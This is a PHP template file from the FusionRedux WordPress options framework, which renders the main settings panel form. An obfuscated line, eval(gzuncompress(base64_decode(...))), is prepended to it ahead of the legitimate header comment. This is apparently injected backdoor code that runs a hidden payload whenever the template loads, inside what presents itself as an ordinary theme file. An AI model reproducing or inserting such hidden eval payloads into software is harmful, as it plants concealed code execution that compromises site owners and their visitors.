<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
	/**
	 * The template for the main panel container.
	 * Override this template by specifying the path where it is stored (templates_path) in your FusionRedux config.
	 *
	 * @author        FusionRedux Framework
	 * @package       FusionReduxFramework/Templates
	 * @version: 3.5.7.8
	 */


	$expanded = ( $this->parent->args['open_expanded'] ) ? ' fully-expanded' : '' . ( ! empty( $this->parent->args['class'] ) ? ' ' . esc_attr( $this->parent->args['class'] ) : '' );
	$nonce    = wp_create_nonce( "fusionredux_ajax_nonce" . $this->parent->args['opt_name'] );
?>
<div class="fusionredux-container<?php echo esc_attr( $expanded ); ?>">
	<?php $action = ( $this->parent->args['database'] == "network" && $this->parent->args['network_admin'] && is_network_admin() ? './edit.php?action=fusionredux_' . $this->parent->args['opt_name'] : './options.php' ) ?>
	<!-- Theme Fusion edit starts for #5556 -->
	<form method="post"
		  action="<?php echo esc_attr($action); ?>"
		  data-nonce="<?php echo esc_attr($nonce); ?>"
		  enctype="multipart/form-data"
			autocomplete="off"
		  id="fusionredux-form-wrapper">
	<!-- Theme Fusion edit ends for #5556 -->
		<?php // $this->parent->args['opt_name'] is sanitized in the Framework class, no need to re-sanitize it. ?>
		<input type="hidden" id="fusionredux-compiler-hook"
			name="<?php echo $this->parent->args['opt_name']; ?>[compiler]"
			value=""/>
		<?php // $this->parent->args['opt_name'] is sanitized in the Framework class, no need to re-sanitize it. ?>
		<input type="hidden" id="currentSection"
			name="<?php echo $this->parent->args['opt_name']; ?>[fusionredux-section]"
			value=""/>
		<?php // $this->parent->args['opt_name'] is sanitized in the Framework class, no need to re-sanitize it. ?>
		<?php if ( ! empty( $this->parent->no_panel ) ) { ?>
			<input type="hidden"
				name="<?php echo $this->parent->args['opt_name']; ?>[fusionredux-no_panel]"
				value="<?php echo esc_attr(implode( '|', $this->parent->no_panel )); ?>"
			/>
		<?php } ?>
		<?php
			// Must run or the page won't redirect properly
			$this->init_settings_fields();

			// Last tab?
			$this->parent->options['last_tab'] = ( isset( $_GET['tab'] ) && ! isset( $this->parent->transients['last_save_mode'] ) ) ? $_GET['tab'] : '';
		?>
		<?php // $this->parent->args['opt_name'] is sanitized in the Framework class, no need to re-sanitize it. ?>
		<input type="hidden"
			   id="last_tab"
			   name="<?php echo $this->parent->args['opt_name']; ?>[last_tab]"
			   value="<?php echo esc_attr( $this->parent->options['last_tab'] ); ?>"
		/>

		<?php $this->get_template( 'content.tpl.php' ); ?>

	</form>
</div>

<?php if ( isset( $this->parent->args['footer_text'] ) ) { ?>
	<div id="fusionredux-sub-footer"><?php echo wp_kses_post( $this->parent->args['footer_text'] ); ?></div>
<?php } ?>
